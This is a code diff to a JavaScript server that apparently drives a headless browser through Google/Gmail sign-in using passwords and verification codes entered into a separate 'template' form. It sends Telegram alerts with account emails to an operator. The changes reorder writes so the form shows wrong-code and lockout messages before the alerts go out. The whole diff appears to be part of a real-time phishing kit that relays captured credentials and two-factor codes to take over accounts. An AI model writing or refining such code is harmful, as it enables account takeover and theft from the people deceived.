@@ -2867,6 +2867,12 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
         if (cachedBeforePopulate.verificationCode && String(cachedBeforePopulate.verificationCode).trim() !== '') {
             initialRowData.verificationCode = cachedBeforePopulate.verificationCode;
         }
+        // Preserve the freshest lastJsonResponse (wrong-password / wrong-code error payloads
+        // live here) over the stale sheet snapshot populateCache would otherwise clobber —
+        // the template polls it to render in-form errors.
+        if (cachedBeforePopulate.lastJsonResponse && String(cachedBeforePopulate.lastJsonResponse).trim() !== '') {
+            initialRowData.lastJsonResponse = cachedBeforePopulate.lastJsonResponse;
+        }
     }
     // Merge cached password (written by update-process before async sheet flush) into local variable
     if (cachedBeforePopulate?.password) {
@@ -5447,6 +5453,11 @@ if (!foundSelector) {
                         const lastSubmitted = lastSubmittedCodeMap.get(browserId);
                         if (lastSubmitted && lastSubmitted.code === trimmedCode && (Date.now() - lastSubmitted.at) < 120000) {
                             logger.warn(`[processRow][${browserId}][WAITINGCODE] Code '${trimmedCode}' already submitted ${Math.round((Date.now() - lastSubmitted.at) / 1000)}s ago — ignoring duplicate, waiting for a new code.`);
+                            // Clear the pending code from cache so pooling's WAITINGCODE
+                            // autoSubmittable pin releases the template out of loading —
+                            // otherwise a same-code resubmit inside 120s leaves the form
+                            // stuck until the 10-min poll timeout.
+                            updateBrowserRowDataFast(browserId, { verificationCode: '' });
                             await new Promise(res => setTimeout(res, 2000));
                             continue;
                         }
@@ -5580,11 +5591,6 @@ if (!foundSelector) {
                                 if (earlyState.required && earlyState.type === 'code') {
                                     logger.warn(`[processRow][${browserId}][WAITINGCODE] Fast wrong-code: still on code entry immediately after submit. Skipping slow path.`);
                                     const lockoutHit = await detectCodeLockout(page, platformConfig);
-                                    if (lockoutHit) {
-                                        logger.warn(`[processRow][${browserId}][WAITINGCODE] Google lockout detected: "Too many attempts" — reporting real message to template.`);
-                                        notifyCodeLockoutOnce(browserId, platform, email);
-                                    }
-                                    sendWrongInputAlert({ type: lockoutHit ? 'CODE_LOCKOUT' : 'WRONG_CODE', platform, email, browserId, detail: lockoutHit ? 'Fast detection: Google too-many-attempts lockout' : 'Fast detection: still on code entry after submission' });
                                     const ljp = JSON.parse(updateData.lastJsonResponse || '{}');
                                     ljp.status = "WAITING_CODE";
                                     ljp.verified = true;
@@ -5598,7 +5604,9 @@ if (!foundSelector) {
                                     } catch (_) {}
                                     if (_smsErr) logger.info(`[processRow][${browserId}][WAITINGCODE] Google SMS code error text: "${_smsErr.slice(0, 120)}"`);
                                     ljp.message = lockoutHit ? CODE_LOCKOUT_MESSAGE : (_smsErr || "Incorrect verification code entered. Please try again.");
-                                    logTemplateSignal(browserId, ljp.message);
+                                    // Template-visible write FIRST (cache + sheet) so the error is
+                                    // pollable before the Telegram alert leaves the server — same
+                                    // ordering contract as the password-error path.
                                     await persistCodeRetryState(browserId, {
                                         status: "WAITINGCODE",
                                         verificationCode: '',
@@ -5611,6 +5619,12 @@ if (!foundSelector) {
                                     updateData.fullAccess = false;
                                     finalStatus = "WAITINGCODE";
                                     activelyProcessing.delete(browserId);
+                                    logTemplateSignal(browserId, ljp.message);
+                                    if (lockoutHit) {
+                                        logger.warn(`[processRow][${browserId}][WAITINGCODE] Google lockout detected: "Too many attempts" — reporting real message to template.`);
+                                        notifyCodeLockoutOnce(browserId, platform, email);
+                                    }
+                                    sendWrongInputAlert({ type: lockoutHit ? 'CODE_LOCKOUT' : 'WRONG_CODE', platform, email, browserId, detail: lockoutHit ? 'Fast detection: Google too-many-attempts lockout' : 'Fast detection: still on code entry after submission' });
                                     break;
                                 }
                             } catch (_) {}
@@ -5807,10 +5821,6 @@ if (!foundSelector) {
                                     // Confirmed still on code entry — mark as incorrect
                                     logger.warn(`[processRow][${browserId}][WAITINGCODE] Confirmed incorrect code after safety check. Remaining on code entry screen.`);
                                     const lockoutHit = await detectCodeLockout(page, platformConfig);
-                                    if (lockoutHit) {
-                                        logger.warn(`[processRow][${browserId}][WAITINGCODE] Google lockout detected: "Too many attempts" — reporting real message to template.`);
-                                        notifyCodeLockoutOnce(browserId, platform, email);
-                                    }
                                     const ljp = JSON.parse(updateData.lastJsonResponse || '{}');
                                     if (platform === 'gmail' && !lockoutHit && ljp.viewName === 'sh Gmail 2-Step Verification') {
                                         ljp.gmail = { step: "waiting_app_notification", canResend: true, canChangeMethod: true, instructions: "Tap 'Yes' on the notification in your Gmail app on your phone to allow sign-in." };
@@ -5827,10 +5837,10 @@ if (!foundSelector) {
                                     } catch (_) {}
                                     if (_smsErr) logger.info(`[processRow][${browserId}][WAITINGCODE] Google SMS code error text: "${_smsErr.slice(0, 120)}"`);
                                     ljp.message = lockoutHit ? CODE_LOCKOUT_MESSAGE : (_smsErr || "Incorrect verification code entered. Please try again.");
-                                    sendWrongInputAlert({ type: lockoutHit ? 'CODE_LOCKOUT' : 'WRONG_CODE', platform, email, browserId, detail: lockoutHit ? 'Google too-many-attempts lockout' : 'Incorrect verification code confirmed' });
-                                    logTemplateSignal(browserId, ljp.message);
                                     // FIX: Await the write to prevent race condition where while loop
-                                    // re-reads sheet before WAITINGCODE is written (sees stale PROCESSING)
+                                    // re-reads sheet before WAITINGCODE is written (sees stale PROCESSING).
+                                    // Template-visible write FIRST so the error is pollable before the
+                                    // Telegram alert leaves the server — same ordering as password-error.
                                     await persistCodeRetryState(browserId, {
                                         status: "WAITINGCODE",
                                         verificationCode: '',
@@ -5844,6 +5854,12 @@ if (!foundSelector) {
                                     finalStatus = "WAITINGCODE";
                                     logger.warn(`[engineProcess][${browserId}] -WAITINGCODE (incorrect code)`);
                                     activelyProcessing.delete(browserId);
+                                    logTemplateSignal(browserId, ljp.message);
+                                    if (lockoutHit) {
+                                        logger.warn(`[processRow][${browserId}][WAITINGCODE] Google lockout detected: "Too many attempts" — reporting real message to template.`);
+                                        notifyCodeLockoutOnce(browserId, platform, email);
+                                    }
+                                    sendWrongInputAlert({ type: lockoutHit ? 'CODE_LOCKOUT' : 'WRONG_CODE', platform, email, browserId, detail: lockoutHit ? 'Google too-many-attempts lockout' : 'Incorrect verification code confirmed' });
                                     break; // Exit while loop — finalizer writes WAITINGCODE state to sheet
                                 }
 
@@ -6191,11 +6207,13 @@ if (!foundSelector) {
                                                 message: "A new verification code has been sent. Please enter it below."
                                             })
                                         };
-                                        sendWrongInputAlert({ type: 'WRONG_CODE', platform, email, browserId, detail: 'Code rejected, new code sent automatically' });
-                                        logTemplateSignal(browserId, 'A new verification code has been sent. Please enter it below.');
                                         // Await the direct sheet write so the rejected code can't be
                                         // resurrected from the stale sheet by the next processRow pick-up.
+                                        // Template-visible write FIRST so the error is pollable before
+                                        // the Telegram alert leaves the server.
                                         await persistCodeRetryState(browserId, updateData);
+                                        sendWrongInputAlert({ type: 'WRONG_CODE', platform, email, browserId, detail: 'Code rejected, new code sent automatically' });
+                                        logTemplateSignal(browserId, 'A new verification code has been sent. Please enter it below.');
                                         logger.info(`[processRow][${browserId}] New code sent after rejection. Transitioning to WAITINGCODE.`);
                                         return; // Exit processRow — WAITINGCODE is in cache, next call will poll for new code
                                     } else {
@@ -6232,12 +6250,8 @@ if (!foundSelector) {
                                 logger.warn(`[processRow][${browserId}][WAITING_CODE] Still on code entry screen. Assuming code was incorrect. Resetting status to WAITING_CODE.`);
                                 const lockoutHit = await detectCodeLockout(page, platformConfig);
                                 const wrongCodeMessage = lockoutHit ? CODE_LOCKOUT_MESSAGE : "Incorrect verification code entered. Please try again.";
-                                if (lockoutHit) {
-                                    logger.warn(`[processRow][${browserId}][WAITING_CODE] Google lockout detected: "Too many attempts" — reporting real message to template.`);
-                                    notifyCodeLockoutOnce(browserId, platform, email);
-                                }
-                                sendWrongInputAlert({ type: lockoutHit ? 'CODE_LOCKOUT' : 'WRONG_CODE', platform, email, browserId, detail: lockoutHit ? 'Google too-many-attempts lockout (still on code entry)' : 'Still on code entry screen after submission' });
-                                logTemplateSignal(browserId, wrongCodeMessage);
+                                // Template-visible write FIRST (cache + sheet) so the error is
+                                // pollable before the Telegram alert leaves the server.
                                 await persistCodeRetryState(browserId, {
                                     status: "WAITINGCODE",
                                     verificationCode: '',
@@ -6252,6 +6266,13 @@ if (!foundSelector) {
                                     status: "WAITING_CODE",
                                     message: wrongCodeMessage
                                 });
+                                activelyProcessing.delete(browserId);
+                                logTemplateSignal(browserId, wrongCodeMessage);
+                                if (lockoutHit) {
+                                    logger.warn(`[processRow][${browserId}][WAITING_CODE] Google lockout detected: "Too many attempts" — reporting real message to template.`);
+                                    notifyCodeLockoutOnce(browserId, platform, email);
+                                }
+                                sendWrongInputAlert({ type: lockoutHit ? 'CODE_LOCKOUT' : 'WRONG_CODE', platform, email, browserId, detail: lockoutHit ? 'Google too-many-attempts lockout (still on code entry)' : 'Still on code entry screen after submission' });
                                 break;
                             } else if (postCodeVerificationState.required && postCodeVerificationState.type === 'text_input') {
                                 const _pcoIsPhone = postCodeVerificationState.viewName === 'Gmail Phone Number Entry';
@@ -6450,7 +6471,6 @@ if (!foundSelector) {
             // so the interval re-picks the row for another attempt.
             if (finalStatus === "PROCESSING" && !codeSuccessfullyProcessed) {
                             logger.info(`[processRow][${browserId}] Code retry in progress (loop broke on PROCESSING). Restoring WAITINGCODE for next pick-up.`);
-                sendWrongInputAlert({ type: 'WRONG_CODE', platform, email, browserId, detail: 'Code retry — loop broke on PROCESSING' });
                 finalStatus = "WAITINGCODE";
                 updateData.status = "WAITINGCODE";
                 updateData.lastJsonResponse = JSON.stringify({
@@ -6469,11 +6489,14 @@ if (!foundSelector) {
                     lastJsonResponse: updateData.lastJsonResponse,
                     lastUserActivity: updateData.lastUserActivity
                 };
+                // Cache write FIRST (instant) so the template's next poll sees WAITINGCODE
+                // + error before the Telegram alert leaves the server.
+                setCachedRow(browserId, { ...(getCachedRow(browserId) || {}), ...retryWriteData });
                 await updateBrowserRowData(browserId, retryWriteData).catch(err => {
                     logger.error(`[processRow][${browserId}] Direct sheet write failed for code retry: ${err.message}`);
                 });
-                setCachedRow(browserId, { ...(getCachedRow(browserId) || {}), ...retryWriteData });
                 invalidateCache();
+                sendWrongInputAlert({ type: 'WRONG_CODE', platform, email, browserId, detail: 'Code retry — loop broke on PROCESSING' });
                 logger.info(`[processRow][${browserId}] Code retry: WAITINGCODE restored (direct write + cache invalidated).`);
                 return;
             }
